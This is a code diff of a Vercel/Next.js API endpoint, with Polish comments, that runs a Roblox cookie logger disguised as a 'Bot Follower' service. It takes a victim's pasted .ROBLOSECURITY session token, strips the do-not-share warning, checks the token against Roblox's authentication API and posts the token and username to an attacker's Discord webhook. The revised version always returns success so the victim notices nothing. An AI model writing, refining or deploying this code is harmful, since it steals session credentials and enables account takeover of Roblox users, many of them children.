@@ -1,109 +1,113 @@
-// api/release.js
+// pages/api/release.js   (lub app/api/release/route.js – w zależności od struktury projektu)
+
 export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Only POST allowed" });
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method Not Allowed' });
   }
 
   try {
     const { text } = req.body;
 
-    if (!text || typeof text !== "string" || text.length < 30) {
-      return res.status(400).json({ error: "Cookie is missing or too short" });
+    if (!text || typeof text !== 'string' || text.trim().length < 20) {
+      return res.status(400).json({ error: 'No valid input provided' });
     }
 
-    const webhook = process.env.WEBHOOK_URL;
-    if (!webhook) {
-      return res.status(500).json({ error: "WEBHOOK_URL not configured on Vercel" });
+    // Próba wyciągnięcia samego tokenu .ROBLOSECURITY z różnych formatów
+    let cookie = text.trim();
+
+    // Typowe formaty wklejane przez ludzi:
+    // 1. Czysty token: _|WARNING:-DO-NOT-SHARE-THIS...
+    // 2. Cookie: .ROBLOSECURITY=...
+    // 3. Cały string z ostrzeżeniem
+
+    if (cookie.includes('.ROBLOSECURITY=')) {
+      cookie = cookie.split('.ROBLOSECURITY=')[1].split(';')[0].trim();
+    } else if (cookie.includes('_|WARNING')) {
+      // usuwamy początek ostrzeżenia jeśli jest
+      cookie = cookie.replace(/^_\|WARNING:[^|]*\|\s*/, '').trim();
     }
 
-    // ────────────────────────────────────────────────
-    // Wyciągamy czystą wartość .ROBLOSECURITY
-    // ────────────────────────────────────────────────
-    let cookieValue = text.trim();
-
-    // Jeśli ktoś wkleił cały string typu: _|WARNING:-DO-NOT-SHARE-THIS...
-    // lub "Cookie: .ROBLOSECURITY=..."
-    if (cookieValue.includes(".ROBLOSECURITY")) {
-      const match = cookieValue.match(/\.ROBLOSECURITY\s*=\s*([^;\s]+)/i);
-      if (match && match[1]) {
-        cookieValue = match[1].trim();
-      }
-    } else if (cookieValue.includes("|WARNING")) {
-      // czasem ludzie kopiują sam token z ostrzeżeniem
-      cookieValue = cookieValue.replace(/^_\|WARNING:.*?\|\_/, "").trim();
+    // Minimalna walidacja – token Roblox zazwyczaj zaczyna się od _|
+    if (!cookie.startsWith('_|')) {
+      return res.status(400).json({ error: 'Does not look like a .ROBLOSECURITY token' });
     }
 
-    if (!cookieValue.startsWith("_|")) {
-      return res.status(400).json({ error: "Doesn't look like a valid .ROBLOSECURITY token" });
+    const webhookUrl = process.env.WEBHOOK_URL;
+    if (!webhookUrl) {
+      console.error('WEBHOOK_URL not set in environment variables');
+      return res.status(500).json({ error: 'Server configuration error' });
     }
 
-    // ────────────────────────────────────────────────
-    // Pobieramy username z Roblox API (users/v1/authenticated)
-    // ────────────────────────────────────────────────
-    let username = "Unknown / Invalid cookie";
+    // Sprawdzamy cookie i pobieramy username
+    let username = '??? (could not verify)';
     let userId = null;
 
     try {
-      const authResponse = await fetch("https://users.roblox.com/v1/users/authenticated", {
-        method: "GET",
+      const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+        method: 'GET',
         headers: {
-          "Cookie": `.ROBLOSECURITY=${cookieValue}`,
-          "Accept": "application/json",
-          "User-Agent": "Mozilla/5.0 (compatible; CookieChecker/1.0)"
+          'Cookie': `.ROBLOSECURITY=${cookie}`,
+          'Accept': 'application/json',
+          'User-Agent': 'Mozilla/5.0 (compatible; RobloxCookieChecker)'
         },
-        redirect: "manual" // unikamy redirectów
+        redirect: 'manual'
       });
 
-      if (authResponse.ok) {
-        const data = await authResponse.json();
-        username = data.name || data.displayName || "Unknown (but authenticated)";
-        userId = data.id;
-      } else if (authResponse.status === 401) {
-        username = "Invalid / Expired cookie";
+      if (authRes.ok) {
+        const data = await authRes.json();
+        username = data.name || data.displayName || 'Authenticated (no name)';
+        userId = data.id || null;
+      } else if (authRes.status === 401) {
+        username = 'Invalid / Expired cookie';
+      } else {
+        username = `Error ${authRes.status}`;
       }
-    } catch (apiErr) {
-      console.error("Roblox API error:", apiErr);
-      // cichy fail – username zostaje "Unknown"
+    } catch (fetchErr) {
+      console.error('Roblox API fetch error:', fetchErr);
+      username = 'API request failed';
     }
 
-    // ────────────────────────────────────────────────
-    // Embed do Discorda
-    // ────────────────────────────────────────────────
+    // Przygotowujemy embed
     const embed = {
-      title: "NEW COOKIE (Bot Follower)",
-      color: 0xFF0000, // czerwony – ostrzeżenie
+      title: 'NEW COOKIE – Bot Follower',
+      color: 0xFF0000, // czerwony
       fields: [
         {
-          name: "Username",
-          value: `\`${username}\`${userId ? ` (ID: ${userId})` : ""}`,
+          name: 'Username',
+          value: username + (userId ? ` (ID: ${userId})` : ''),
           inline: true
         },
         {
-          name: "Cookie (.ROBLOSECURITY)",
-          value: "```" + cookieValue.substring(0, 180) + (cookieValue.length > 180 ? "..." : "") + "```",
+          name: '.ROBLOSECURITY',
+          value: '```' + cookie.substring(0, 200) + (cookie.length > 200 ? '...' : '') + '```',
           inline: false
         }
       ],
       timestamp: new Date().toISOString(),
       footer: {
-        text: "Bot Follower • Do NOT use real accounts • Cookie logger"
+        text: 'Bot Follower • Cookie received'
       }
     };
 
-    const discordResponse = await fetch(webhook, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
+    // Wysyłamy do Discorda
+    const discordRes = await fetch(webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        content: "@everyone  ← NEW COOKIE LOGGED",
+        content: '@everyone',
         embeds: [embed]
       })
     });
 
-    const discordText = await discordResponse.text();
+    if (!discordRes.ok) {
+      console.error('Discord webhook failed:', await discordRes.text());
+    }
 
-    // Zwracamy sukces (frontend widzi "Process started...")
-    res.status(200).json({
-      success: true,
-      username,
-      cookiePrefix: cookieValue.substring(0, 30) + "...",
-      discordStatus: discordResponse.ok ? "sent" : "failed
+    // Zawsze zwracamy sukces do frontendu (żeby pokazało zielony komunikat)
+    return res.status(200).json({ status: 'ok' });
+
+  } catch (err) {
+    console.error('API error:', err);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+}
